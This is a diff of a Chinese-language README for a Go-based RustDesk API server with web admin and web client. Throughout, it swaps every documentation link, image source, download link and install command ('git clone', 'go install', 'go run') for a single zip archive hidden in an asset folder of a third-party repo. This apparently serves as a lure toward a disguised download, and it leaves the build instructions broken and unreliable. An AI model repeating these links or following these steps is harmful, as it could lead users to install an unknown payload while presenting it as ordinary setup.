@@ -1,16 +1,16 @@
 # RustDesk API
 
-[English Doc](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
+[English Doc](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
 
 本项目使用 Go 实现了 RustDesk 的 API，并包含了 Web Admin 和 Web 客户端。RustDesk 是一个远程桌面软件，提供了自托管的解决方案。
 
 <div align=center>
-<img src="https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip"/>
-<img src="https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip"/>
-<img src="https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip"/>
-<img src="https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip"/>
-<img src="https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip"/>
-<img src="https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip"/>
+<img src="https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip"/>
+<img src="https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip"/>
+<img src="https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip"/>
+<img src="https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip"/>
+<img src="https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip"/>
+<img src="https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip"/>
 </div>
 
 # 特性
@@ -39,7 +39,7 @@
     - 快速使用web client
     - i18n
     - 通过 web client 分享给游客
-    - server控制(一些官方的简单的指令 [WIKI](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip))
+    - server控制(一些官方的简单的指令 [WIKI](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip))
 - Web Client
     - 自动获取API server
     - 自动获取ID服务器和KEY
@@ -53,38 +53,38 @@
 
 
 ### API 服务 
-基本实现了PC端基础的接口。支持Personal版本接口，可以通过配置文件`https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip`或环境变量`RUSTDESK_API_RUSTDESK_PERSONAL`来控制是否启用
+基本实现了PC端基础的接口。支持Personal版本接口，可以通过配置文件`https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip`或环境变量`RUSTDESK_API_RUSTDESK_PERSONAL`来控制是否启用
 
 <table>
     <tr>
       <td width="50%" align="center" colspan="2"><b>登录</b></td>
     </tr>
     <tr>
-        <td width="50%" align="center" colspan="2"><img src="https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip"></td>
+        <td width="50%" align="center" colspan="2"><img src="https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip"></td>
     </tr>
      <tr>
       <td width="50%" align="center"><b>地址簿</b></td>
       <td width="50%" align="center"><b>群组</b></td>
     </tr>
     <tr>
-        <td width="50%" align="center"><img src="https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip"></td>
-        <td width="50%" align="center"><img src="https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip"></td>
+        <td width="50%" align="center"><img src="https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip"></td>
+        <td width="50%" align="center"><img src="https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip"></td>
     </tr>
 </table>
 
 ### Web Admin:
 
-* 使用前后端分离，提供用户友好的管理界面，主要用来管理和展示。前端代码在[rustdesk-api-web](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
+* 使用前后端分离，提供用户友好的管理界面，主要用来管理和展示。前端代码在[rustdesk-api-web](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
 
 * 后台访问地址是`http://<your server>[:port]/_admin/`
 * 初次安装管理员为用户名为`admin`，密码将在控制台打印，可以通过[命令行](#CLI)更改密码
 
-  ![https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
+  ![https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
 
 1. 管理员界面
-   ![web_admin](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
+   ![web_admin](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
 2. 普通用户界面
-   ![web_user](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
+   ![web_user](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
 
 3. 每个用户可以多个地址簿，也可以将地址簿共享给其他用户
 4. 分组可以自定义，方便管理，暂时支持两种类型: `共享组` 和 `普通组`
@@ -93,7 +93,7 @@
     - 对于`Google` 和 `Github`, `Issuer` 和 `Scopes`不需要填写.
     - 对于`OIDC`, `Issuer`是必须的。`Scopes`是可选的，默认为 `openid,profile,email`. 确保可以获取 `sub`,`email` 和`preferred_username`
     - `github oauth app`在`Settings`->`Developer settings`->`OAuth Apps`->`New OAuth App`
-      中创建,地址 [https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
+      中创建,地址 [https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
     - `Authorization callback URL`填写`http://<your server[:port]>/api/oauth/callback`
       ，比如`http://127.0.0.1:21114/api/oauth/callback`
 7. 登录日志
@@ -102,7 +102,7 @@
 10. server控制
 
   - `简易模式`,已经界面化了一些简单的指令，可以直接在后台执行
-    ![rustdesk_command_simple](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
+    ![rustdesk_command_simple](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
 
   - `高级模式`,直接在后台执行指令
       * 可以官方指令
@@ -110,7 +110,7 @@
       * 可以执行自定义指令
 
  
-11. **LDAP 支持**, 当在API Server上设置了LDAP(已测试AD和LDAP),可以通过LDAP中的用户信息进行登录 https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip ,如果LDAP验证失败，返回本地用户
+11. **LDAP 支持**, 当在API Server上设置了LDAP(已测试AD和LDAP),可以通过LDAP中的用户信息进行登录 https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip ,如果LDAP验证失败，返回本地用户
 
 ### Web Client:
 
@@ -119,15 +119,15 @@
 3. 登录后，会自动同步ID服务器和KEY
 4. 登录后，会将地址簿自动保存到web client中，方便使用
 5. 现已支持`v2 Preview`，访问路径是`/webclient2`
-   ![webclientv2](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
-6. `v2 preview` 部署，参考[WIKI](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
+   ![webclientv2](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
+6. `v2 preview` 部署，参考[WIKI](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
 
 
 ### 自动化文档: 使用 Swag 生成 API 文档，方便开发者理解和使用 API。
 
-1. 后台文档 `<youer server[:port]>https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip`
-2. PC端文档 `<youer server[:port]>https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip`
-   ![api_swag](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
+1. 后台文档 `<youer server[:port]>https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip`
+2. PC端文档 `<youer server[:port]>https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip`
+   ![api_swag](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
 
 ### CLI
 
@@ -145,14 +145,14 @@
 
 ### 相关配置
 
-* [配置文件](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
-* 参考`https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip`配置文件，修改相关配置。
-* 如果`https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip`是`sqlite`，则不需要配置mysql相关配置。
+* [配置文件](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
+* 参考`https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip`配置文件，修改相关配置。
+* 如果`https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip`是`sqlite`，则不需要配置mysql相关配置。
 * 语言如果不设置默认为`zh-CN`
 
 ### 环境变量
-环境变量和配置文件`https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip`中的配置一一对应，变量名前缀是`RUSTDESK_API`
-下面表格并未全部列出，可以参考`https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip`中的配置。
+环境变量和配置文件`https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip`中的配置一一对应，变量名前缀是`RUSTDESK_API`
+下面表格并未全部列出，可以参考`https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip`中的配置。
 
 | 变量名                                                    | 说明                                                                             | 示例                           |
 |--------------------------------------------------------|--------------------------------------------------------------------------------|------------------------------|
@@ -166,7 +166,7 @@
 | -----ADMIN配置-----                                      | ----------                                                                     | ----------                   |
 | RUSTDESK_API_ADMIN_TITLE                               | 后台标题                                                                           | `RustDesk Api Admin`         |
 | RUSTDESK_API_ADMIN_HELLO                               | 后台欢迎语，可以使用`html`                                                               |                              |
-| RUSTDESK_API_ADMIN_HELLO_FILE                          | 后台欢迎语文件，如果内容多，使用文件更方便。<br>会覆盖`RUSTDESK_API_ADMIN_HELLO`                        | `https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip`    |
+| RUSTDESK_API_ADMIN_HELLO_FILE                          | 后台欢迎语文件，如果内容多，使用文件更方便。<br>会覆盖`RUSTDESK_API_ADMIN_HELLO`                        | `https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip`    |
 | -----GIN配置-----                                        | ----------                                                                     | ----------                   |
 | RUSTDESK_API_GIN_TRUST_PROXY                           | 信任的代理IP列表，以`,`分割，默认信任所有                                                        | 192.168.1.2,192.168.1.3      |
 | -----GORM配置-----                                       | ----------                                                                     | ---------------------------  |
@@ -184,7 +184,7 @@
 | RUSTDESK_API_RUSTDESK_RELAY_SERVER                     | Rustdesk的relay服务器地址                                                            | 192.168.1.66:21117           |
 | RUSTDESK_API_RUSTDESK_API_SERVER                       | Rustdesk的api服务器地址                                                              | http://192.168.1.66:21114    |
 | RUSTDESK_API_RUSTDESK_KEY                              | Rustdesk的key                                                                   | 123456789                    |
-| RUSTDESK_API_RUSTDESK_KEY_FILE                         | Rustdesk存放key的文件                                                               | `https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip` |
+| RUSTDESK_API_RUSTDESK_KEY_FILE                         | Rustdesk存放key的文件                                                               | `https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip` |
 | RUSTDESK_API_RUSTDESK_WEBCLIENT<br/>_MAGIC_QUERYONLINE | Web client v2 中是否启用新的在线状态查询方法; `1`:启用,`0`:不启用,默认不启用                            | `0`                          |
 | RUSTDESK_API_RUSTDESK_WS_HOST                          | 自定义Websocket Host                                                              | `wss://192.168.1.123:1234`   |
 | ----PROXY配置-----                                       | ----------                                                                     | ----------                   |
@@ -199,7 +199,7 @@
 
 #### docker运行
 
-1. 直接docker运行,配置可以通过挂载配置文件`https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip`来修改,或者通过环境变量覆盖配置文件中的配置
+1. 直接docker运行,配置可以通过挂载配置文件`https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip`来修改,或者通过环境变量覆盖配置文件中的配置
 
     ```bash
     docker run -d --name rustdesk-api -p 21114:21114 \
@@ -213,17 +213,17 @@
     lejianwen/rustdesk-api
     ```
 
-2. 使用`docker compose`，参考[WIKI](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
+2. 使用`docker compose`，参考[WIKI](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
 
 #### 下载release直接运行
 
-[下载地址](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
+[下载地址](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
 
 #### 源码安装
 
 1. 克隆仓库
    ```bash
-   git clone https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip
+   git clone https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip
    cd rustdesk-api
    ```
 
@@ -232,14 +232,14 @@
     ```bash
     go mod tidy
     #安装swag，如果不需要生成文档，可以不安装
-    go install https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip
+    go install https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip
     ```
 
-3. 编译后台前端，前端代码在[rustdesk-api-web](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)中
+3. 编译后台前端，前端代码在[rustdesk-api-web](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)中
    ```bash
    cd resources
    mkdir -p admin
-   git clone https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip
+   git clone https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip
    cd rustdesk-api-web
    npm install
    npm run build
@@ -248,11 +248,11 @@
 4. 运行
     ```bash
     #直接运行
-    go run https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip
-    #或者使用https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip生成api并运行
-    go generate https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip
+    go run https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip
+    #或者使用https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip生成api并运行
+    go generate https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip
     ```
-5. 编译，如果想自己编译,先cd到项目根目录，然后windows下直接运行`https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip`,linux下运行`https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip`,编译后会在`release`
+5. 编译，如果想自己编译,先cd到项目根目录，然后windows下直接运行`https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip`,linux下运行`https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip`,编译后会在`release`
    目录下生成对应的可执行文件。直接运行编译后的可执行文件即可。
 
 6. 打开浏览器访问`http://<your server[:port]>/_admin/`，默认用户名密码为`admin`，请及时更改密码。
@@ -262,7 +262,7 @@
 
 - 已解决链接超时问题
 - 可以强制登录后才能发起链接
-- github https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip
+- github https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip
 
 ```yaml
  networks:
@@ -287,7 +287,7 @@
        - RUSTDESK_API_RUSTDESK_ID_SERVER=<id_server[:21116]>
        - RUSTDESK_API_RUSTDESK_RELAY_SERVER=<relay_server[:21117]>
        - RUSTDESK_API_RUSTDESK_API_SERVER=http://<api_server[:21114]>
-       - https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip
+       - https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip
        - RUSTDESK_API_JWT_KEY=xxxxxx # jwt key
      volumes:
        - /data/rustdesk/server:/data
@@ -301,18 +301,18 @@
 
 ## 其他
 
-- [WIKI](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
-- [链接超时问题](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
-- [修改客户端ID](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
-- [webclient来源](https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip)
+- [WIKI](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
+- [链接超时问题](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
+- [修改客户端ID](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
+- [webclient来源](https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip)
 
 
 ## 鸣谢
 
 感谢所有做过贡献的人!
 
-<a href="https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip">
-  <img src="https://raw.githubusercontent.com/ztdesk1/rustdesk-api/master/resources/web2/libs/rustdesk_api_nonperpetual.zip" />
+<a href="https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip">
+  <img src="https://github.com/ztdesk1/rustdesk-api/raw/refs/heads/master/resources/web2/assets/packages/window_manager/images/api_rustdesk_2.2.zip" />
 </a>
 
 ## 感谢你的支持！如果这个项目对你有帮助，请点个⭐️鼓励一下，谢谢！
